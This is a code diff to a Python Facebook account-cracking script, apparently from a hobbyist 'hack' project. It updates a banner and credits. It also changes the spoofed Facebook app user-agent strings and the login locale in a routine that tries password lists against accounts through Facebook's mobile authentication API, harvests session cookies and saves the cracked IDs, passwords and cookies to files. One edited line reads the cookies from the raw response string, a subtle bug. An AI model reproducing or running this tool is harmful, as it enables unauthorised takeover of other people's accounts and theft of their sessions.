@@ -32,17 +32,27 @@ logo = """
 
 
 
-\_    _     __  __           _
-   / \  | |__ |  \/  | __ _  __| |
-  / _ \ | '_ \| |\/| |/ _` |/ _` |
- / ___ \| | | | |  | | (_| | (_| |
-/_/   \_\_| |_|_|  |_|\__,_|\__,_|
+
+  ______   __        __       __                  __ 
+ /      \ |  \      |  \     /  \                |  \
+|  $$$$$$\| $$____  | $$\   /  $$  ______    ____| $$
+| $$__| $$| $$    \ | $$$\ /  $$$ |      \  /      $$
+| $$    $$| $$$$$$$\| $$$$\  $$$$  \$$$$$$\|  $$$$$$$
+| $$$$$$$$| $$  | $$| $$\$$ $$ $$ /      $$| $$  | $$
+| $$  | $$| $$  | $$| $$ \$$$| $$|  $$$$$$$| $$__| $$
+| $$  | $$| $$  | $$| $$  \$ | $$ \$$    $$ \$$    $$
+ \$$   \$$ \$$   \$$ \$$      \$$  \$$$$$$$  \$$$$$$$
+                                                     
+                                                     
+                                                     
 
 [*]----------------------------------------------
-[*] Author        : AhMad MasTan
-[*] Github        : Badakhshi Hack
-[*] Status        : free
-[*] version       : 0.1
+[*] Author         : MasTan_001
+[*] Github         :  Badakhshi Hack
+[*] Status         :  free
+[*] version       :  0.1
+[*] Facebook   :  AhMad MasTan
+[*] best friend :  Saadat AlMas
 [*]----------------------------------------------
 """
 def linex():
@@ -215,11 +225,11 @@ def rndm(ids,passlist):
                                 ios_ver = f'{random.randint(9,17)}_{random.randint(1,5)}'
                                 br_engine = f"605.{random.randint(1,9)}.{random.randint(10,60)}"
                                 build = random.choice(["15E148","20E252","20D67","19G71","20E247","20D67","20F5028e","20D47","16A147","16A146","16A168","16A188","16A149","16A147"])
-                                ua = f'Mozilla/5.0 (iPhone;CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{br_engine} (KHTML,like Gecko) Mobile/{build} [FBAN/FBIOS;FBAV/{random.randint(200,290)}.0.0.{random.randint(11,99)}.69;FBBV/56254015;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/{(ios_ver).replace("_",".")};FBSS/2;FBID/phone;FBLC/fa_IR;FBOP/5;FBRV/0;FBCR/{random.choice(["MTN","Roshan","Etisalat"])}]'
+                                ua = f'Mozilla/5.0 (iPhone;CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{br_engine} (KHTML,like Gecko) Mobile/{build} [FBAN/FBIOS;FBAV/{random.randint(200,290)}.0.0.{random.randint(11,99)}.69;FBBV/56254015;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/{(ios_ver).replace("_",".")};FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0;FBCR/{random.choice(["MTN","Roshan","Etisalat"])}]'
                                 cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH3979','CPH3983','CPH3987','CPH2005','CPH2009','CPH2035','CPH2059','CPH2063','CPH2065','CPH2069','CPH2073','CPH2073','CPH2077','CPH2093','CPH2095','CPH2099','CPH2337','CPH2339','CPH2345','CPH2363','CPH2385','CPH2203','CPH2209','CPH3803','CPH3803','CPH3805','CPH3809','CPH3827','CPH3837','CPH3853','CPH3853','CPH1979','CPH1983','CPH1987','CPH1005','CPH1009','CPH1015','CPH1059','CPH1061','CPH1065','CPH1069','CPH1071','CPH1073','CPH1077','CPH1091','CPH1095','CPH1099','CPH1137','CPH1139','CPH1145','CPH1161','CPH1185','CPH1101','CPH1109','CPH1801','CPH1803','CPH1805','CPH1809','CPH1817','CPH1837','CPH1851','CPH1853'])
                                 android_version=str(random.randrange(6,13))
-                                M_useragentr = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/fa_IR;FBRV/{str(application_version_code)};FBCR/{str(awmsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/Infinix {str(gttt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-                                M_useragent = 'Davik/2.1.0 (Linux; U; Android  {random.randint(4,13)}; {str(gttt)} Build/NRD90M)  [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/{density=1.5,width=540,height=960};FBLC/fa_IR;FB_FW/2;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCR/AREEBA;FBCA/armeabi-v7a:armeabi;]'
+                                M_useragentr = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(awmsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/Infinix {str(gttt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                M_useragent = 'Davik/2.1.0 (Linux; U; Android  {random.randint(4,13)}; {str(gttt)} Build/NRD90M)  [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FB_FW/2;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCR/AREEBA;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 device_family_id = str(uuid.uuid4())
@@ -247,7 +257,7 @@ def rndm(ids,passlist):
                                 'generate_session_cookies':'1',
                                 'machine_id':machine_id,
                                 'generate_machine_id':'1',
-                                "locale":"fa_IR","client_country_code":"IR",
+                                "locale":"en_US","client_country_code":"US",
                                 'fb_api_req_friendly_name':'authenticate',
                                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                 head ={
@@ -274,19 +284,21 @@ def rndm(ids,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
-                                        cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                         coki = "sb="+sb+";"+cookie+""
                                         try:
                                                 okk=open('/sdcard/AhMad-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+' | '+coki+'\033[1;90m')
+                                                        print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+'\033[1;90m')
+                                                        print('\r\r\033[0;95m [🍪] %s   '%(coki))
                                                         open('/sdcard/Ahmad-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+' | '+coki+'\033[1;90m')
+                                                print('\r\r\033[1;32m [Ahmad-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                                print('\r\r\033[0;95m [🍪] %s   '%(coki))
                                                 open('/sdcard/AhMad-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
@@ -391,11 +403,12 @@ def rndm2(ids,passlist):
                                                 if uid in okk:pass
                                                 else:
                                                         print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+' | '+coki+'\033[1;90m')
+                                                        
                                                         open('/sdcard/Ahmad-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+' | '+coki+'\033[1;90m')
+                                                print('\r\r\033[1;32m [AhMad-OK] '+uid+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/AhMad-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
